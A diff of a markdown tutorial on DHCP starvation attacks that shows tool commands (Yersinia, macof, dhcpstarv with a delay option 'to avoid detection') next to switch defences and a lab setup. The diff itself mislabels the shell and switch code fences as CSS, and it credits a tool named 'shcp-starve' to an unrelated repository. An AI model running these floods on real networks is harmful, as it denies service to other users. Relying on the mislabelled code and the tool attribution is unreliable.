@@ -22,13 +22,13 @@ Several tools can be used for DHCP Starvation, including:
 ### **Example Using Yersinia**
 
 **1. Install Yersinia**
-```bash
+```css
 sudo apt update
 sudo apt install yersinia -y
 ```
 
 **2. Launch Yersinia in Interactive Mode**
-```bash
+```css
 sudo yersinia -I
 ```
 
@@ -45,12 +45,12 @@ sudo yersinia -I
 `macof` is a simpler tool that can be used if you want to quickly test DHCP starvation.
 
 **1. Install Dsniff (which includes macof)**
-```bash
+```css
 sudo apt install dsniff -y
 ```
 
 **2. Launch macof**
-```bash
+```css
 sudo macof -i eth0
 ```
 
@@ -61,7 +61,7 @@ This command generates thousands of fake MAC addresses on the network, causing t
 **Scapy** is a Python library for network packet manipulation. You can use it to write a custom script for DHCP starvation.
 
 **1. Install Scapy**
-```bash
+```css
 sudo pip install scapy
 ```
 
@@ -86,7 +86,7 @@ dhcp_starvation()
 ```
 
 **3. Run the Script**
-```bash
+```css
 sudo python3 dhcp_starvation.py
 ```
 
@@ -126,7 +126,7 @@ In addition to tools like Yersinia and macof, **`shcp-starve`** is another dedic
 **1. Installation of `shcp-starve`**
    
    You can download the source code and install it from GitHub:
-   ```bash
+   ```css
    sudo apt update
    sudo apt install git build-essential -y
    git clone https://github.com/netsniff-ng/netsniff-ng.git
@@ -137,7 +137,7 @@ In addition to tools like Yersinia and macof, **`shcp-starve`** is another dedic
 **2. Running `shcp-starve`**
 
    To start the DHCP Starvation attack, use the following command:
-   ```bash
+   ```css
    sudo ./shcp-starve -i eth0
    ```
 
@@ -165,7 +165,7 @@ To defend against DHCP Starvation attacks, implement the following:
 1. **DHCP Snooping**:
    - This feature helps prevent DHCP Starvation by monitoring DHCP messages and allowing only trusted ports to respond to DHCP requests.
 
-   ```bash
+   ```css
    Switch(config)# ip dhcp snooping
    Switch(config)# ip dhcp snooping vlan 10
    Switch(config)# interface FastEthernet 0/1
@@ -175,7 +175,7 @@ To defend against DHCP Starvation attacks, implement the following:
 2. **Port Security**:
    - Set a limit on the number of MAC addresses that can be learned on a switch port to prevent excessive requests from multiple MACs.
 
-   ```bash
+   ```css
    Switch(config-if)# switchport port-security
    Switch(config-if)# switchport port-security maximum 2
    ```
@@ -183,7 +183,7 @@ To defend against DHCP Starvation attacks, implement the following:
 3. **Rate Limiting**:
    - Limit the rate of DHCP requests from a single interface to mitigate the flood of requests.
 
-   ```bash
+   ```css
    Switch(config-if)# ip dhcp snooping limit rate 10
    ```
 
@@ -194,20 +194,20 @@ To defend against DHCP Starvation attacks, implement the following:
 
 **Setup**:
 1. **DHCP Server**: Use a simple DHCP server like `dnsmasq` for testing.
-   ```bash
+   ```css
    sudo apt install dnsmasq
    sudo dnsmasq --dhcp-range=192.168.1.2,192.168.1.50,12h
    ```
 
 2. **Testing the Attack**:
    - Start the `shcp-starve` attack on the same network interface.
-     ```bash
+     ```css
      sudo ./shcp-starve -i eth0
      ```
 
 3. **Check DHCP Leases**:
    - Verify that the DHCP server's IP pool is exhausted.
-   ```bash
+   ```css
    cat /var/lib/dnsmasq/dnsmasq.leases
    ```
 
@@ -234,7 +234,7 @@ This guide provides a comprehensive understanding of DHCP Starvation using diffe
 
 `dhcpstarv` is included in some penetration testing distributions like Kali Linux. If it's not installed, you can use the following steps:
 
-```bash
+```css
 sudo apt update
 sudo apt install dhcpstarv -y
 ```
@@ -242,26 +242,26 @@ sudo apt install dhcpstarv -y
 ### **Using `dhcpstarv`**
 
 **1. Basic Command**
-```bash
+```css
 sudo dhcpstarv -i eth0
 ```
 - **`-i eth0`** specifies the network interface to attack.
 
 **2. Example Output**
-```bash
+```css
 [*] Sending DHCP DISCOVER packets...
 [*] IP pool exhausted: No more IP addresses available
 ```
 
 **3. Specifying the Number of Requests**
 You can control the number of DHCP requests with the `-c` option:
-```bash
+```css
 sudo dhcpstarv -i eth0 -c 1000
 ```
 
 **4. Limiting the Attack Rate**
 To avoid detection, you can slow down the request rate using the `-d` option to specify a delay in milliseconds:
-```bash
+```css
 sudo dhcpstarv -i eth0 -d 100
 ```
 
@@ -269,14 +269,14 @@ sudo dhcpstarv -i eth0 -d 100
 
 1. **Check DHCP Leases**:
    On the DHCP server, you can verify if the IP pool is exhausted by listing the DHCP leases:
-   ```bash
+   ```css
    cat /var/lib/dhcp/dhcpd.leases
    ```
    You should see many leases assigned to random MAC addresses.
 
 2. **Check Network Logs**:
    Use the following command to monitor DHCP server logs:
-   ```bash
+   ```css
    sudo tail -f /var/log/syslog | grep DHCP
    ```
    You will observe multiple DHCP DISCOVER and OFFER messages filling the logs.
@@ -285,7 +285,7 @@ sudo dhcpstarv -i eth0 -d 100
 
 1. **Enable DHCP Snooping**:
    - This feature monitors DHCP messages, allowing only trusted ports to respond to DHCP requests and limiting DHCP responses to authorized devices.
-   ```bash
+   ```css
    Switch(config)# ip dhcp snooping
    Switch(config)# ip dhcp snooping vlan 10
    Switch(config-if)# ip dhcp snooping trust
@@ -293,13 +293,13 @@ sudo dhcpstarv -i eth0 -d 100
 
 2. **Rate Limiting**:
    - Limit the number of DHCP requests per second on a switch port:
-   ```bash
+   ```css
    Switch(config-if)# ip dhcp snooping limit rate 10
    ```
 
 3. **MAC Filtering**:
    - Limit the number of MAC addresses per port to prevent MAC spoofing:
-   ```bash
+   ```css
    Switch(config-if)# switchport port-security
    Switch(config-if)# switchport port-security maximum 2
    ```
@@ -312,20 +312,20 @@ sudo dhcpstarv -i eth0 -d 100
 **Setup**:
 1. **DHCP Server**:
    - Install a simple DHCP server like `dnsmasq`:
-   ```bash
+   ```css
    sudo apt install dnsmasq
    sudo dnsmasq --dhcp-range=192.168.1.2,192.168.1.50,12h
    ```
    
 2. **Launching the Attack**:
    - On a different machine (attacker), run:
-   ```bash
+   ```css
    sudo dhcpstarv -i eth0
    ```
 
 3. **Monitoring**:
    - On the DHCP server, check if the IP pool is exhausted using:
-   ```bash
+   ```css
    cat /var/lib/dnsmasq/dnsmasq.leases
    ```
 
